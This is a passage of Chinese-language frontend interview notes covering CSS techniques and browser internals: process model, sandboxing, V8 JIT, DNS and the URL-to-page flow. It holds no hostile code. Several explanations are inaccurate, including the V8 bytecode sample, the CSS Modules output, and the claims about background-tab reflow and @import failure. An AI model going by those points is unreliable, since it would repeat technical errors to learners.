/* 5. 硬件加速别名 */
transform: translateZ(0);
```

**注意事项：合成层过多会导致内存占用过大。**

#### 14.3 will-change 作用

```css
/* 提前告诉浏览器元素的哪些属性会变化 */
.animated {
  will-change: transform;    /* 浏览器提前创建合成层 */
}

/* 动画结束后移除 */
.animated {
  will-change: auto; /* 动画结束后关闭 */
}

/* 不推荐的写法：全局应用 */
* { will-change: transform; } /* 内存爆炸 */
```

---

### 15. opacity vs visibility vs display 区别

| 属性 | 值 | 可见性 | 交互（点击等） | 渲染 | 过渡动画 |
|------|-----|-------|-------------|------|---------|
| `display: none` | - | 不可见 | 不存在 | **不渲染**，不占位 | 不可过渡 |
| `visibility: hidden` | - | 不可见 | 不可交互 | **渲染但不可见**，占位 | 可过渡 |
| `visibility: collapse` | - | 不可见（表格行/列塌陷） | 不可交互 | 渲染但行为特殊 | 可过渡 |
| `opacity: 0` | 0-1 | 不可见 | **可交互** | **渲染**，占位 | 可过渡 |

```css
/* display: none */
.hidden { display: none; }
/* → 不渲染（不占位，DOM 仍存在但不渲染） */
/* → 无法通过 transition 过渡 */

/* visibility: hidden */
.hidden { visibility: hidden; }
/* → 渲染但不可见（占位，opacity: 0 但可交互） */
/* → visibility 可过渡：hidden → visible */
/* → 子元素可用 visibility: visible 覆盖显示 */

/* opacity: 0 */
.hidden { opacity: 0; }
/* → 渲染且可见度为0（占位，仍可点击/交互！） */
/* → 可过渡：0 → 1 */

.hidden {
  opacity: 0;
  pointer-events: none; /* 结合 pointer-events 禁用交互 */
}
```

---

### 16. line-height 垂直居中原理，水平垂直居中方法

#### 16.1 line-height 垂直居中原理

```
文字在行盒中垂直居中的原理：

┌─ line-height（行高）───────┐  ← 上下 padding+content 共同撑起行高
│                           │
│   ┌─ line box（行盒）─────┐ │  ← 行盒高度 = line-height
│   │                       │ │
│   │  content area(内容区) │ │  ← content area 高度 ≈ font-size
│   │  文字 x-height        │ │
│   │  ════════════════     │ │
│   │  ══════════════════  │ │  ← 文字在 content area 中按 baseline 对齐
│   │                       │ │
│   └───────────────────────┘ │
│                           │
└───────────────────────────┘
```

```css
/* 单行文字垂直居中 */
.box {
  height: 40px;
  line-height: 40px; /* = height，文字在高度上居中 */
}

/* 多行文字居中：可用 flexbox 更灵活 */
.box {
  display: flex;
  align-items: center;
  height: 100px;
}
```

#### 16.2 水平居中方法

```css
/* 块级元素 */
.block-center {
  margin-left: auto;
  margin-right: auto;
  width: fit-content;
}

/* flexbox */
.flex-center-x {
  display: flex;
  justify-content: center;
}

/* grid */
.grid-center-x {
  display: grid;
  justify-content: center;
}

/* text-align */
.text-center {
  text-align: center;
}
```

#### 16.3 垂直居中方法

```css
/* flexbox（推荐，最简洁） */
.flex-center {
  display: flex;
  justify-content: center;
  align-items: center;
}

/* grid（推荐，最简洁） */
.grid-center {
  display: grid;
  place-items: center;
}

/* position + transform */
.pos-center > .child {
  position: absolute;
  top: 50%;
  left: 50%;
  transform: translate(-50%, -50%);
}

/* table-cell 模拟 */
.table-center {
  display: table;
}
.table-center > .child {
  display: table-cell;
  vertical-align: middle;
  text-align: center;
}

/* line-height（仅限单行文字） */
.line-height-center {
  height: 100px;
  line-height: 100px;
  text-align: center;
}
```

---

### 17. 多行省略，0.5px 实现，三角形/正方形/自适应高度/瀑布流

#### 17.1 多行文本省略

```css
/* 单行省略（常用） */
.single-line {
  overflow: hidden;
  text-overflow: ellipsis;
  white-space: nowrap;
}

/* 多行省略（CSS 实现，需 WebKit） */
.multi-line {
  display: -webkit-box;
  -webkit-box-orient: vertical;
  -webkit-line-clamp: 3; /* 显示3行 */
  overflow: hidden;
  text-overflow: ellipsis;
}
```

#### 17.2 0.5px 边框实现

```css
/* 方法1：transform: scaleY（最常用） */
.scale-border {
  position: relative;
}
.scale-border::after {
  content: '';
  position: absolute;
  bottom: 0;
  left: 0;
  width: 100%;
  height: 1px;
  background: #000;
  transform: scaleY(0.5);
}

/* 方法2：box-shadow */
.box-shadow-border {
  box-shadow: inset 0 -0.5px #000;
}

/* 方法3：渐变 */
.gradient-border {
  background:
    linear-gradient(to bottom, #000 50%, transparent 50%) bottom / 100% 1px no-repeat;
  background-position: 0 100%;
}
```

#### 17.3 CSS 图形实现

```css
/* 三角形：利用 border 对边等宽原理 */
.triangle-up {
  width: 0;
  height: 0;
  border-left: 50px solid transparent;
  border-right: 50px solid transparent;
  border-bottom: 100px solid red;
}

.triangle-down {
  width: 0;
  height: 0;
  border-left: 50px solid transparent;
  border-right: 50px solid transparent;
  border-top: 100px solid blue;
}

/* 正方形：利用 aspect-ratio */
.square {
  width: 50%;
  aspect-ratio: 1; /* 现代 CSS */
}

/* 自适应高度：视口高度 */
.full-height {
  height: 100vh;
  height: 100dvh; /* 动态视口高度（移动端地址栏变化时更新） */
}
```

#### 17.4 瀑布流布局

```css
/* 方式1：CSS columns（最简单） */
.waterfall {
  column-count: 3;
  column-gap: 10px;
}
.waterfall-item {
  break-inside: avoid;
  margin-bottom: 10px;
}

/* 方式2：grid + dense 流 */
.waterfall-grid {
  display: grid;
  grid-template-columns: repeat(3, 1fr);
  grid-auto-rows: 10px;
  grid-auto-flow: row dense;
}
.item:nth-child(1) { grid-row: span 20; }
.item:nth-child(2) { grid-row: span 15; }
.item:nth-child(3) { grid-row: span 25; }
```

---

### 18. 暗黑模式，prefers-color-scheme

#### 18.1 prefers-color-scheme 媒体查询

```css
/* 系统级暗黑模式检测 */
@media (prefers-color-scheme: dark) {
  :root {
    --bg-color: #121212;
    --text-color: #e0e0e0;
    --link-color: #8ab4f8;
  }
}

@media (prefers-color-scheme: light) {
  :root {
    --bg-color: #ffffff;
    --text-color: #000000;
    --link-color: #1a73e8;
  }
}

/* 使用 CSS 变量 */
body {
  background: var(--bg-color);
  color: var(--text-color);
}
```

#### 18.2 JS 检测

```javascript
const prefersDark = window.matchMedia('(prefers-color-scheme: dark)').matches;

// 监听变化
window.matchMedia('(prefers-color-scheme: dark)').addEventListener('change', (e) => {
  if (e.matches) {
    document.documentElement.setAttribute('data-theme', 'dark');
  } else {
    document.documentElement.setAttribute('data-theme', 'light');
  }
});
```

#### 18.3 HTML 手动切换

```html
<meta name="color-scheme" content="light dark">
```

```css
/* 手动切换：data-theme 属性 */
[data-theme="dark"] {
  --bg-color: #121212;
  --text-color: #e0e0e0;
}
[data-theme="light"] {
  --bg-color: #ffffff;
  --text-color: #000000;
}
```

---

### 19. CSS Modules 原理，scoped 原理，深度选择器

#### 19.1 CSS Modules

CSS Modules 是 CSS 的局部作用域方案，通过编译时转换实现类名唯一性。

```css
/* Button.module.css */
.button {
  padding: 8px 16px;
  background: blue;
}

.primary {
  background: #0066ff;
}
```

```javascript
import styles from './Button.module.css';

export function Button() {
  return (
    <button className={styles.button + ' ' + styles.primary}>
      Click
    </button>
  );
}

/* 编译后 HTML：*/
/* <button class="Button_button__3x7Kw Button_primary__3x7Kw">Click</button> */
```

**CSS Modules 原理：**
```
源文件：
.button { background: blue; }

编译后（webpack css-loader）：
.button { background: blue; }
.Button_button__3x7Kw { background: blue; }
/* hash 基于文件路径和类名生成，保证全局唯一 */
```

#### 19.2 Vue scoped 原理

```html
<style scoped>
.button {
  color: red;
}
</style>
```

```css
/* 编译后： */
.button[data-v-hash] {
  color: red;
}
```

**scoped CSS 原理：**
```
1. Vue 组件编译时，为每个组件生成一个唯一的 hash
2. 所有 CSS 选择器后加 [data-v-hash]
3. 模板中的元素自动添加 data-v-hash 属性
4. 结果：选择器只匹配本组件的元素
```

#### 19.3 深度选择器（穿透 scoped）

```css
/* Vue 中穿透 scoped */

/* 方法1：:deep() */
:deep(.external-class) {
  color: red;
}

/* 方法2：::v-deep（Vue2 专用） */
::v-deep .inner {
  color: red;
}

/* 方法3：:global()（Vue3 新语法） */
:global(.global-class) {
  color: blue;
}
```

---

### 20. CSS-in-JS，styled-components 原理，TailwindCSS 原理与原子化 CSS

#### 20.1 CSS-in-JS

CSS-in-JS 是在 JavaScript 中编写 CSS 样式的方案：

```javascript
// styled-components 方式
import styled from 'styled-components';

const Button = styled.button`
  padding: 8px 16px;
  border-radius: 4px;
  background: ${props => props.primary ? '#0066ff' : '#ccc'};
  color: white;
`;

// emotion 方式
import { css } from '@emotion/react';
const styles = css`padding: 8px 16px; background: blue;`;
```

#### 20.2 styled-components 原理

```javascript
/* 原理概述：
   1. 用模板字符串定义 CSS
   2. 运行时生成唯一的类名
   3. 通过 <style> 标签注入到 head
   4. 将类名绑定到组件上 */

function styled(tag) {
  return function(strings, ...values) {
    return function(props) {
      const css = strings.reduce((acc, str, i) => {
        return acc + str + (values[i] ? values[i](props) : '');
      }, '');
      const className = hash(css);
      injectStyle(`.${className}`, css);
      return createElement(tag, { className, ...props });
    };
  };
}
```

#### 20.3 TailwindCSS 原理与原子化 CSS

TailwindCSS 是原子化（utility-first）CSS 框架，通过组合小的工具类实现样式：

```html
<!-- 传统 CSS -->
<div class="card">
  <style>.card { padding: 24px; border-radius: 8px; background: white; box-shadow: 0 2px 8px rgba(0,0,0,0.1); }</style>
</div>

<!-- TailwindCSS -->
<div class="p-6 rounded-lg bg-white shadow-md">
```

**TailwindCSS 原理：**
```
1. 配置文件定义设计系统（颜色、间距等）
2. PurgeCSS 扫描源码，找出使用的类名
3. 生成只包含使用过的类的 CSS（约 10-100kb）
4. 生产构建：只打包实际使用的样式
```

**原子化 CSS 的优缺点：**

```
优点：
- 无需写自定义 CSS，快速开发
- 一致性好（基于设计系统）
- 样式复用性极高
- 便于维护（样式即文档）

缺点：
- HTML 标签变长（class="..."）
- 学习曲线（需记忆工具类名）
- 无类型安全（IDE 插件很重要）
```

#### 20.4 原子化 CSS 框架对比

| 框架 | 特点 | JIT | 流行度 |
|------|------|-----|--------|
| TailwindCSS | 功能完整，设计系统友好 | 是 | 高 |
| UnoCSS | 超快，按需生成，无预置主题 | 是 | 增长快 |
| WindiCSS | TailwindCSS 替代，启动更快 | 是 | 中 |
| Vanilla Extract | 类型安全，编译时 | 是 | 增长中 |

---

### 21. CSS 阻塞渲染，link vs @import，CSS 性能优化

#### 21.1 CSS 阻塞渲染原理

```
浏览器渲染流水线：

HTML 解析
    ↓
CSS 下载 + 解析（render-blocking）
    ↓
DOM Tree + CSSOM → Render Tree
    ↓
Layout（计算布局）
    ↓
Paint（绘制）
    ↓
Composite（合成）
    ↓
显示

CSS 是 render-blocking 资源：
→ 浏览器不会渲染任何内容，直到 CSSOM 构建完成
```

#### 21.2 link vs @import

```html
<!-- link（推荐）：并行下载，不阻塞 HTML 解析 -->
<link rel="stylesheet" href="style.css">

<!-- @import（不推荐）：串行下载，阻塞渲染 -->
<style>
  @import url("other.css");
  @import url("another.css");
</style>
```

**@import 加载顺序：** 串行！一个失败全失败！link 并行：所有 CSS 同时下载。

#### 21.3 CSS 性能优化

**减少 CSS 体积：**
```css
/* 1. CSS 压缩（cssnano / csso / clean-css） */

/* 2. 移除未使用的 CSS（PurgeCSS / UnCSS） */

/* 3. 提取关键 CSS，内联首屏样式 */

/* 4. 使用 CSS 变量，减少重复定义 */
:root {
  --primary: #0066ff;
  --spacing: 8px;
}
```

**减少渲染阻塞：**
```html
<!-- 1. Critical CSS 内联 -->
<head>
  <style>/* 首屏关键样式 */</style>
</head>

<!-- 2. 非关键 CSS 异步加载 -->
<link rel="stylesheet" href="non-critical.css"
      media="print" onload="this.media='all'">

<!-- 3. preload 关键资源 -->
<link rel="preload" href="font.woff2" as="font" crossorigin type="font/woff2">

<!-- 4. font-display 优化字体加载 -->
@font-face {
  font-family: 'MyFont';
  src: url('font.woff2') format('woff2');
  font-display: swap;
}
```

**减少选择器复杂度：**
```css
/* ❌ 复杂选择器 */
.header nav ul li a span { }

/* ✅ 简单选择器 */
.nav-link { }
```

---

### 22. CSS 难维护原因，BEM 命名规范

#### 22.1 CSS 难维护的常见原因

1. **全局作用域污染**：所有选择器在全局生效，容易冲突
2. **样式覆盖层叠复杂**：优先级混乱，修改一个样式影响多个地方
3. **选择器耦合**：CSS 依赖 HTML 结构，结构一变样式就乱
4. **重复样式**：相同样式在多处定义，维护困难
5. **无类型安全**：拼写错误静默失效

**解决方案：**
- CSS Modules（局部作用域）
- CSS-in-JS（组件级样式）
- BEM 命名（命名约定）
- Utility-First 框架（原子化）
- CSS 变量（主题一致性）

#### 22.2 BEM 命名规范

BEM = Block（块） + Element（元素） + Modifier（修饰符）

```
Block      → 独立的功能模块（最大粒度）
Element    → Block 的组成部分（用 __ 连接）
Modifier   → 状态/变体（用 -- 连接）
```

```css
/* Block：卡片组件 */
.card { }

/* Element：卡片内部元素 */
.card__header { }
.card__body { }
.card__title { }

/* Modifier：卡片变体 */
.card--featured { }
.card--dark { }

/* Element + Modifier */
.card__title--large { }
```

```html
<article class="card card--featured">
  <header class="card__header">
    <h2 class="card__title">标题</h2>
  </header>
  <div class="card__body">
    <p class="card__text">内容</p>
  </div>
  <footer class="card__footer">
    <button class="card__button card__button--primary">按钮</button>
  </footer>
</article>
```

**BEM 优点：**
- 类名自解释（命名即文档）
- 避免命名冲突
- 结构清晰，易维护
- 配合 CSS Modules 效果更好

---

### 23. PostCSS，Autoprefixer 原理，Sass/Less 区别，Sass mixin，CSS Houdini

#### 23.1 PostCSS

PostCSS 是一个用 JavaScript 插件转换 CSS 的工具（不是预处理器）：

```
CSS 输入 → PostCSS 解析器 → AST（抽象语法树） → 插件链 → 输出 CSS
```

**常见插件：**
- `autoprefixer`：自动添加浏览器前缀
- `postcss-preset-env`：将现代 CSS 转换为兼容性更好的版本
- `cssnano`：压缩优化 CSS
- `stylelint`：CSS 代码检查

#### 23.2 Autoprefixer 原理

```css
/* 输入 */
.flex {
  display: flex;
  user-select: none;
  transition: transform 0.3s;
}

/* Autoprefixer 输出（根据 browserslist） */
.flex {
  display: -webkit-box;
  display: -webkit-flex;
  display: -ms-flexbox;
  display: flex;
  -webkit-user-select: none;
  -ms-user-select: none;
  user-select: none;
  -webkit-transition: -webkit-transform 0.3s;
  transition: -webkit-transform 0.3s;
  transition: transform 0.3s;
}
```

**原理：**
```
1. Autoprefixer 读取 browserslist 配置（如 "> 1%", "last 2 versions"）
2. 解析 CSS，识别需要前缀的属性
3. 查询 Can I Use 数据库，确定哪些特性需要前缀
4. 在 CSS 声明前插入前缀版本
```

#### 23.3 Sass/Less 区别

| 特性 | Sass (SCSS) | Less |
|------|------------|------|
| 语法 | SCSS（CSS 超集，大括号） / 缩进语法 | 类 CSS 语法 |
| 变量符号 | `$var` | `@var` |
| 混合宏 | `@mixin` / `@include` | `.mixin()` |
| 继承 | `@extend` | 无（用 mixin 或占位符） |
| 条件语句 | `@if / @else` | `.when`（有限） |
| 循环 | `@for / @each / @while` | 无原生循环 |
| 编译 | Dart Sass / LibSass | JS（lessc） |

```scss
/* Sass/SCSS */
$primary: #0066ff;
$spacing: 8px;

@mixin flex-center {
  display: flex;
  justify-content: center;
  align-items: center;
}

.container {
  padding: $spacing;
  @include flex-center;

  &__item {
    margin: $spacing / 2;
  }

  &:hover {
    background: darken($primary, 10%);
  }
}

/* 继承 */
.error {
  color: red;
  padding: 12px;
}
.error-box {
  @extend .error;
  border: 1px solid red;
}
```

```less
/* Less */
@primary: #0066ff;
@spacing: 8px;

.flex-center() {
  display: flex;
  justify-content: center;
  align-items: center;
}

.container {
  padding: @spacing;
  .flex-center();

  &__item {
    margin: @spacing / 2;
  }

  &:hover {
    background: fade(@primary, 80%);
  }
}
```

#### 23.4 Sass Mixin

```scss
/* 简单 mixin */
@mixin flex-center {
  display: flex;
  justify-content: center;
  align-items: center;
}

/* 带参数的 mixin */
@mixin rounded($radius: 4px) {
  border-radius: $radius;
}

/* 多参数 */
@mixin box-shadow($x, $y, $blur, $color) {
  box-shadow: $x $y $blur $color;
}

/* 可变参数 */
@mixin transform($values...) {
  transform: $values;
}

/* 条件 mixin */
@mixin respond-to($breakpoint) {
  @if $breakpoint == 'mobile' {
    @media (max-width: 576px) { @content; }
  } @else if $breakpoint == 'tablet' {
    @media (max-width: 768px) { @content; }
  }
}

.sidebar {
  @include respond-to('tablet') {
    display: none;
  }
}
```

#### 23.5 CSS Houdini

CSS Houdini 是一组底层 API，允许开发者介入浏览器的 CSS 引擎：

```javascript
// 1. Paint Worklet：自定义绘制
registerPaint('my-pattern', class {
  static get inputProperties() { return ['--my-color']; }
  paint(ctx, size, props) {
    ctx.fillStyle = props.get('--my-color');
    ctx.fillRect(0, 0, size.width, size.height);
  }
});
```

```css
/* 使用 */
.pattern {
  background: paint(my-pattern);
  --my-color: red;
}
```

**Houdini 主要 API：**
- **Paint API**：自定义背景、边框等绘制逻辑
- **Layout API**：自定义布局算法（如 masonry）
- **Animation Worklet**：与主线程分离的高性能动画
- **Properties & Values API**：注册自定义 CSS 属性（带类型和初始值）
- **Typed OM**：类型化 CSS 对象模型（替代字符串拼接）

---

*（待续：第三章 JavaScript 超高频八股）*

---

## Chapter 5: 浏览器原理终极题库

### 5.1 浏览器多进程架构

#### 架构图

```
+------------------------------------------------------------------+
|                        浏览器主进程 (Browser Process)             |
|  +------------+  +-------------+  +-----------+  +------------+ |
|  | UI线程     |  | 网络线程     |  | 存储线程   |  | 插件线程   | |
|  | (地址栏/    |  | (网络请求    |  | (读写      |  | (加载和运行| |
|  |  前进后退)  |  |  管理)      |  |  localStorage|  |  浏览器插件| |
|  +------------+  +-------------+  +-----------+  +------------+ |
+------------------------------------------------------------------+
              |              |              |              |
    +---------+---+    +-----+----+   +----+----+   +-----+-----+
    | 渲染进程 1  |    | 渲染进程 2  |   | 渲染进程 3  |   | GPU进程  |
    | (Tab 1)   |    | (Tab 2)   |   | (Tab 3)   |   |        |
    | JS引擎    |    | JS引擎    |   | JS引擎    |   | GPU合成  |
    | 渲染引擎   |    | 渲染引擎   |   | 渲染引擎   |   |        |
    | 事件循环   |    | 事件循环   |    | 事件循环   |   |        |
    +-----------+    +-----------+   +-----------+   +----------+
```

#### 各进程职责

| 进程 | 职责 | 是否多实例 |
|------|------|----------|
| 浏览器主进程 | 地址栏、书签、前进后退、UI绘制、网络请求 | 唯一 |
| 渲染进程 | HTML/CSS解析、JS执行、页面渲染、事件处理 | 每个Tab一个 |
| GPU进程 | CSS动画、3D变换、GPU合成 | 可多个(Chrome 77+) |
| 网络进程 | DNS、TCP、TLS、HTTP请求 | 唯一(Chromium) |
| 插件进程 | PDF、Flash等插件 | 按需创建 |

#### 渲染进程内部结构

```
渲染进程
+------------------------------------------------------------------+
|  主线程 (Main Thread)                                             |
|  +---------+ +---------+ +---------+ +---------+ +------------+  |
|  | HTML    | | CSS     | | DOM     | | Layout  | | Paint     |  |
|  | Parser  | | Parser  | | Tree    | | Tree    | | (Layer)   |  |
|  +---------+ +---------+ +---------+ +---------+ +------------+  |
|                                                                   |
|  +------------+  +-----------+  +------------+  +--------------+  |
|  | JavaScript |  | Style     |  | Composite  |  | 事件分发器   |  |
|  | Engine     |  | Calculator|  | 器          |  | (Hit Test)  |  |
|  | (V8)       |  | (Style)   |  |            |  |              |  |
|  +------------+  +-----------+  +------------+  +--------------+  |
|                                                                   |
|  +--------------------------------------------------------------+ |
|  | 预扫描器 (Preload Scanner) — 不阻塞解析，快速扫描资源链接     | |
|  +--------------------------------------------------------------+ |
+------------------------------------------------------------------+
|  合成线程 (Compositor Thread)                                     |
|  +-------------+  +-------------+  +------------+                 |
|  | 合成层管理   |  | 光栅化调度   |  | 帧提交      |                 |
|  +-------------+  +-------------+  +------------+                 |
+------------------------------------------------------------------+
|  工作线程池 (Worker Thread Pool)                                  |
|  +----------+  +----------+  +----------+                          |
|  | Web Worker|  | Service |  | Worklet  |                          |
|  |           |  | Worker  |  | (Paint/  |                          |
|  |           |  |          |  | Layout)  |                          |
|  +----------+  +----------+  +----------+                          |
+------------------------------------------------------------------+
```

---

### 5.2 为什么浏览器是多进程

**单进程架构的问题：**

```javascript
// 问题1: 一个Tab崩溃导致整个浏览器崩溃
// 问题2: JS死循环阻塞UI线程，无法响应用户
// 问题3: 恶意网页可以访问其他Tab的数据
// 问题4: 内存泄漏影响整个浏览器
```

**多进程的优势：**

1. **隔离性**: 每个Tab独立渲染进程，一个崩溃不影响其他
2. **安全性**: 渲染进程运行在沙箱中，无法直接访问文件系统
3. **流畅性**: JS死循环只影响当前Tab
4. **内存共享**: 不同域的渲染进程之间无法互相访问内存

**渲染进程是什么：**
渲染进程是浏览器中负责解析和渲染网页的独立进程，每个浏览器Tab都有一个独立的渲染进程。它包含V8引擎（执行JS）、Blink渲染引擎（解析HTML/CSS）、事件循环、预扫描器等组件。

---

### 5.3 沙箱与 Site Isolation

#### 沙箱原理

```
用户态空间
+---------------------------+  +---------------------------+
|     渲染进程 A (沙箱内)      |  |     渲染进程 B (沙箱内)      |
|  无法访问:                 |  |  无法访问:                 |
|  - 文件系统                |  |  - 文件系统                |
|  - GPU设备                |  |  - GPU设备                 |
|  - 进程间直接通信           |  |  - 进程间直接通信           |
|  - 摄像头/麦克风(未授权)     |  |  - 摄像头/麦克风(未授权)     |
+---------------------------+  +---------------------------+
              |                            |
              v                            v
+---------------------------------------------------------------+
|                     浏览器主进程 (特权进程)                    |
|   网络请求 | 文件系统访问 | 密码管理 | 证书验证 | GPU命令        |
+---------------------------------------------------------------+
```

#### Site Isolation（站点隔离）

Site Isolation 是 Chrome 2018年引入的安全机制，确保**不同站点的页面**运行在**不同的渲染进程**中。

```
无 Site Isolation:
渲染进程X:
  +--- iframe: a.example.com (子资源)
  +--- iframe: b.example.com (子资源)
  → 同进程，a.com 的 JS 可以通过 Spectre 侧信道读取 b.com 的数据

有 Site Isolation:
渲染进程A: a.example.com 主页面 + a.example.com 子iframe
渲染进程B: b.example.com 主页面 + b.example.com 子iframe
渲染进程C: cdn.example.com 子资源 (img/css/js)
→ 不同进程，Spectre 攻击面大幅缩小
```

**关键：跨Site的iframe一定运行在不同进程中**，即使主框架相同。

---

### 5.4 V8 引擎为什么快：JIT 编译体系

#### V8 架构全景

```
+------------------------------------------------------------------+
|                         V8 引擎                                   |
|                                                                  |
|  +----------------+     +----------------+     +--------------+ |
|  |   Parser       | --> |    AST         | --> |  Ignition    | |
|  | (解析器)        |     |  (抽象语法树)   |     |  (字节码解释器)| |
|  +----------------+     +----------------+     +--------------+ |
|                                                           |      |
|                                              +------------+--------+
|                                              |   TurboFan       |
|                                              | (优化 JIT 编译器)  |
|                                              +-------------------+
|                                                                  |
|  +----------------+  +----------------+  +--------------------+  |
|  |  Hidden Class  |  |  Inline Cache  |  |  Garbage Collector |  |
|  |  (隐藏类)       |  |  (内联缓存)    |  |  (垃圾回收器)        |  |
|  +----------------+  +----------------+  +--------------------+  |
+------------------------------------------------------------------+
```

#### 编译流程

```javascript
// 源代码
function add(a, b) {
  return a + b;
}
add(1, 2);
add(3, 4);

// Step 1: Scanner -> Token 流
// Token: [function, add, (, a, ,, b, ), {, return, a, +, b, ;, }]

// Step 2: Parser -> AST
// Program
//   └── FunctionDeclaration (add)
//         ├── params: [a, b]
//         └── body: ReturnStatement
//               └── BinaryExpression (+)
//                     ├── Identifier: a
//                     └── Identifier: b

// Step 3: Ignition (解释器) -> 字节码
// LdaNamedProperty a0, [0]    ; 加载 a
// Star r1                     ; 存到 r1
// LdaNamedProperty a1, [1]    ; 加载 b
// Add r1                      ; 相加
// Return                      ; 返回

// Step 4: Hot Code 触发 TurboFan 优化
// 如果 add 函数被调用多次（如1000次+），TurboFan 识别热代码
// 生成优化机器码，使用 SSA (Static Single Assignment)
// 类型专门化: 如果 a,b 始终是整数，优化为快速整数加法
```

#### Hidden Class（隐藏类）

```javascript
// JavaScript 是动态类型语言，V8 用 Hidden Class 模拟静态结构
function Point(x, y) {
  this.x = x;
  this.y = y;
}

var p1 = new Point(1, 2);  // V8 创建 Hidden Class C0 -> C1 -> C2
var p2 = new Point(3, 4);  // p2 和 p1 共享 Hidden Class 链 (C0->C1->C2)

//  Hidden Class 链:
//  C0 (创建时，空对象)
//    x 属性 -> C1
//    y 属性 -> C2
//  C1 (有 x)
//    y 属性 -> C2
//  C2 (有 x,y)

// 性能陷阱：动态添加属性导致 Hidden Class 分叉
var p3 = new Point(5, 6);
p3.z = 7;  // 差劲！创建新的 Hidden Class C3，性能下降
// 正确做法：构造函数中一次性声明所有属性
```

#### Inline Cache（内联缓存）

```javascript
function getX(obj) {
  return obj.x;  // 每次调用，V8 记录 obj 的 Hidden Class
}

// 第1次调用: obj 的 Hidden Class 是 C2
// V8 在调用点记录: "C2 的 x 在 offset 16"

// 第2-N次调用: 如果 Hidden Class 仍是 C2，直接用记录的 offset 读取
// 不需要查表，时间复杂度 O(1) -> 接近静态语言性能

// 第N+1次调用: Hidden Class 变化了，缓存失效
// V8 记录多个 Hidden Class 的信息 (Monomorphic -> Polymorphic)
// 如果太多不同 Hidden Class，回退到慢速查表 (Megamorphic)
```

#### V8 快的原因总结

1. **JIT 混合编译**: 解释执行快速启动，热代码即时优化
2. **TurboFan 优化编译器**: 生成高度优化的机器码
3. **Hidden Class**: 模拟静态类型，属性访问 O(1)
4. **Inline Cache**: 缓存类型信息，避免重复查表
5. **Garbage Collector**: 分代回收（新生代/老生代），减少停顿
6. **字节码**: Ignition 字节码比机器码更紧凑，提升缓存命中率

---

### 5.5 浏览器输入 URL 到页面展示：完整 14 步

```
用户输入 URL
     │
     ▼
Step 1: URL 解析
     - 地址栏判断是搜索词还是 URL
     - 若无协议前缀，自动补全 https://
     - Chrome 同时启动预搜索（Omnibox suggestion）
     │
     ▼
Step 2: 检查 HSTS 预加载列表
     - 若命中 HSTS，从 HTTP 升级到 HTTPS
     │
     ▼
Step 3: DNS 解析（详见 5.6 节）
     - 浏览器 DNS 缓存 -> 系统 DNS 缓存 -> hosts 文件 -> DNS 服务器
     │
     ▼
Step 4: 建立 TCP 连接（三次握手）
     - 若 HTTPS，还要 TLS 握手
     │
     ▼
Step 5: 发送 HTTP 请求
     GET /index.html HTTP/1.1
     Host: www.example.com
     Accept: text/html
     ...
     │
     ▼
Step 6: 服务器处理请求，返回 HTTP 响应
     │
     ▼
Step 7: 检查缓存（强缓存/协商缓存，详见 5.8 节）
     │
     ▼
Step 8: 准备渲染进程（Render Process）
     - 根据 Site Isolation 规则分配/复用渲染进程
     - 若已存在相同站点的渲染进程，可能复用（process reuse）
     │
     ▼
Step 9: 渲染进程主线程开始工作
     │
     ▼ 9a: 解析 HTML -> DOM Tree
     │  HTML Parser 边扫描边构建 Token -> DOM 节点
     │  遇到 <link> 触发 CSS 解析 -> CSSOM
     │  遇到 <script> 阻塞 HTML 解析（无 defer/async）
     │  遇到 <img>/<script src> 预扫描器发现并通知网络线程
     │
     ▼ 9b: 解析 CSS -> CSSOM Tree
     │  CSS Parser 构建 CSS 规则树
     │  计算每个 DOM 节点的最终样式（Style Calculation）
     │
     ▼ 9c: 生成 Render Tree
     │  DOM Tree + CSSOM Tree -> Render Tree
     │  可见节点 + 样式信息，display:none 的节点不进入 Render Tree
     │
     ▼ 9d: Layout（布局）
     │  计算每个元素的几何信息（位置、大小）
     │  涉及回流（reflow）—— 昂贵的布局计算
     │
     ▼ 9e: Paint（绘制）
     │  将布局信息转换为绘制记录（Paint Records）
     │  分层（Layer），每个合成层独立绘制
     │
     ▼ 9f: 分层与合成（Composite）
     │  Compositor Thread 对各合成层进行光栅化
     │  合成层按 z-index 叠加，生成最终帧
     │
     ▼
Step 10: 显示页面内容（First Contentful Paint / FCP）
     │
     ▼
Step 11: 执行 JavaScript（JS 线程）
     - 若有 Web Worker，并行执行，不阻塞主线程
     - requestAnimationFrame 调度
     - Intersection Observer 触发懒加载
     │
     ▼
Step 12: 加载执行剩余资源
     - 懒加载图片、Code Splitting 动态导入
     - Intersection Observer 触发图片加载
     │
     ▼
Step 13: 页面可交互（Time to Interactive / TTI）
     │
     ▼
Step 14: 后台标签静默期
     - 预渲染（Back/Forward Cache / bfcache）
     - 定期触发回流/重绘以保持活性
```

---

### 5.6 DNS 解析全过程与 DNS 缓存

#### DNS 解析流程

```
浏览器缓存 (Chrome: chrome://net-internals/#dns)
     │
     ▼ [不存在]
系统缓存 (Windows: ipconfig /displaydns, macOS: lookupd)
     │
     ▼ [不存在]
本地 DNS 解析器 (/etc/resolv.conf, 通常是 ISP 或 Google 8.8.8.8)
     │
     ▼
根域名服务器 (.) —— 全球13组根服务器
     │  .com .net .org ...
     ▼
顶级域名服务器 (TLD) —— .com 的 TLD 服务器
     │
     ▼
权威域名服务器 —— example.com 的 NS 记录
     │
     ▼
A 记录 / AAAA 记录
     IP: 93.184.216.34
```

#### DNS 缓存层级

| 缓存位置 | 存活时间 | 优先级 |
|---------|---------|-------|
| 浏览器 DNS 缓存 | TTL 分钟数或数分钟 | 最高 |
| 操作系统 DNS 缓存 | TTL 分钟数 | 次高 |
| 本地 DNS 解析器缓存 | 可配置 | 视配置 |
| 递归 DNS 服务器（ISP） | 取决于 TTL | 中 |
| 权威 DNS 服务器 | 由域名所有者设定 | 来源 |

#### DNS 解析代码示例

```javascript
// 在 <head> 中声明预解析
const html = `
  <link rel="dns-prefetch" href="//cdn.example.com" />
  <link rel="preconnect" href="https://cdn.example.com"
        crossorigin="anonymous" />
`;

// 使用 fetch 触发 DNS（间接方式）
fetch('https://example.com/favicon.ico', { mode: 'no-cors' })
  .then(() => console.log('DNS 已解析'));

// DNS-over-HTTPS (DoH) 示例 — 防止 DNS 污染
const dnsQuery = async (domain) => {
  const response = await fetch(
    `https://cloudflare-dns.com/dns-query?name=${domain}&type=A`,
    { headers: { 'Accept': 'application/dns-json' } }
  );
  const data = await response.json();
  return data.Answer?.[0]?.data;
};
```

---

### 5.7 浏览器缓存机制：强缓存 vs 协商缓存

#### 完整缓存决策流程

```
HTTP 响应到达浏览器
         │
         ▼
